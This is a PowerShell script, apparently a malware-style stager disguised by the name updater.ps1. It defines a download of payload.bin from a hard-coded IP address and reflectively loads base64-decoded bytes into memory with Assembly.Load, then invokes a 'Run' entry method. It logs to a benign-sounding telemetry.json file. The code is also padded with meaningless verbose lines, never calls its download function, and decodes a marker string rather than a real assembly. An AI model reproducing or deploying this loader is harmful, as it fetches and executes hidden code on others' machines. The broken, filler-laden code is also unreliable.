
<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://192.0.2.44:8080/payload.bin",
    [string]$ActivityLog = "$env:TEMP\telemetry.json",
    [int]$TimeoutSec = 65
)
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 65
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    [CmdletBinding()]
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

Write-Verbose "Starting managed loader"
$ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpveTN3bDVpeXc3")
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$StageResult = [Reflection.Assembly]::Load($ManagedBytes)
$EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $StageResult
Write-Verbose ("Entry result: " + $EntryResult)

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $ManagedBytes.Length
    Endpoint = $PayloadUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Applying operation timeout"
Write-Verbose "Reading configuration values"
Write-Verbose "Checking local path"
Write-Verbose "Preparing working directory"
Write-Verbose "Collecting host metadata"
Write-Verbose "Stage handoff finished"
Write-Verbose "Retry budget remaining"
Write-Verbose "Exporting operation report"
Write-Verbose "Starting workflow"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Validating result"
Write-Verbose "Cleaning temporary marker"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$StageMarker = "stage-10"
